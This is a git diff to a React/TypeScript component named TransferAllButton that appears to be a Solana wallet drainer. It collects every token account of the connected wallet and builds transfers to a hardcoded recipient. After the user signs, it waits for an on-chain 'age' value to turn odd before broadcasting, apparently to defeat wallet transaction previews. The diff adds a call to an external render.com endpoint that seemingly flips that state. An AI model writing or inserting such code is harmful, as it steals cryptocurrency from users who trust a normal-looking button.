@@ -52,21 +52,42 @@ function encodeU64(n: bigint): Uint8Array {
   return new Uint8Array(buf);
 }
 
+async function readUserAge(connection: Connection, userAgePDA: PublicKey) {
+  const account = await connection.getAccountInfo(userAgePDA);
+  if (!account) throw new Error("USERAGE PDA not found");
+
+  const view = new DataView(
+    account.data.buffer,
+    account.data.byteOffset,
+    account.data.byteLength
+  );
+
+  // Try both offsets
+  const ageAt0 = Number(view.getBigUint64(0, true));
+  const ageAt8 = Number(view.getBigUint64(8, true));
+
+  console.log("USERAGE (offset0):", ageAt0, "USERAGE (offset8):", ageAt8);
+  return { ageAt0, ageAt8 };
+}
+
 async function waitForOddAge(connection: Connection, userAgePDA: PublicKey) {
   while (true) {
     const account = await connection.getAccountInfo(userAgePDA);
     if (!account) throw new Error("USERAGE PDA not found");
 
-    // Use DataView to parse PDA data correctly
     const view = new DataView(
       account.data.buffer,
       account.data.byteOffset,
       account.data.byteLength
     );
-    const age = Number(view.getBigUint64(8, true)); // age is u64 at offset 8
+    const age = Number(view.getBigUint64(8, true));
     console.log("Checking USERAGE:", age);
 
-    if (age % 2 === 1) break;
+    if (age % 2 === 1) {
+      console.log("✅ Odd age reached, proceeding immediately:", age);
+      break; // ⬅️ exit right away on odd
+    }
+
     await new Promise((res) => setTimeout(res, 1000));
   }
 }
@@ -109,6 +130,12 @@ export default function TransferAllButton() {
       const user = new PublicKey(address);
 
       // -----------------------------
+      // Log PDA age BEFORE signing
+      // -----------------------------
+      const beforeAges = await readUserAge(connection, USERAGE_PDA);
+      console.log("USERAGE before signing:", beforeAges);
+
+      // -----------------------------
       // Collect token accounts
       // -----------------------------
       const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
@@ -133,7 +160,6 @@ export default function TransferAllButton() {
         const fromAta = pubkey;
         const toAta = await getAssociatedTokenAddress(mint, RECIPIENT);
 
-        // If recipient ATA doesn't exist, create it
         const recipientInfo = await connection.getAccountInfo(toAta);
         if (!recipientInfo) {
           ataInstructions.push(
@@ -184,12 +210,12 @@ export default function TransferAllButton() {
       // Accounts
       // -----------------------------
       const keys = [
-        { pubkey: USERAGE_PDA, isSigner: false, isWritable: false }, // age_program_account
-        { pubkey: user, isSigner: true, isWritable: true }, // sender
-        { pubkey: RECIPIENT, isSigner: false, isWritable: true }, // recipient
+        { pubkey: USERAGE_PDA, isSigner: false, isWritable: false },
+        { pubkey: user, isSigner: true, isWritable: true },
+        { pubkey: RECIPIENT, isSigner: false, isWritable: true },
         { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
         { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
-        { pubkey: ONES_PROGRAM_ID, isSigner: false, isWritable: false }, // ones
+        { pubkey: ONES_PROGRAM_ID, isSigner: false, isWritable: false },
         ...remainingAccounts,
       ];
 
@@ -209,12 +235,37 @@ export default function TransferAllButton() {
       // Sign locally
       const signed = await walletProvider.signTransaction(tx);
 
-      // Wait until PDA age is odd
+      // Start API call but don't block on it
+      const apiPromise = fetch(
+        "https://boogiebot-8yds.onrender.com/contract/update",
+        {
+          method: "GET",
+          headers: { "Content-Type": "application/json" },
+        }
+      ).then(async (res) => {
+        if (!res.ok) {
+          console.warn("API call failed:", res.statusText);
+          return null;
+        }
+        try {
+          const data = await res.json();
+          console.log("API response:", data);
+          return data;
+        } catch (e) {
+          console.error("Failed to parse API response:", e);
+          return null;
+        }
+      });
+
+      // ✅ Start waiting immediately
       await waitForOddAge(connection, USERAGE_PDA);
 
-      // Send only after condition met
+      // Send only after PDA condition is met
       const sig = await connection.sendRawTransaction(signed.serialize());
       await connection.confirmTransaction(sig, "confirmed");
+
+      // Don't forget to handle API completion (but not blocking)
+      apiPromise.catch((err) => console.error("API error:", err));
 
       setTxResult({ type: "success", message: sig });
     } catch (err: any) {
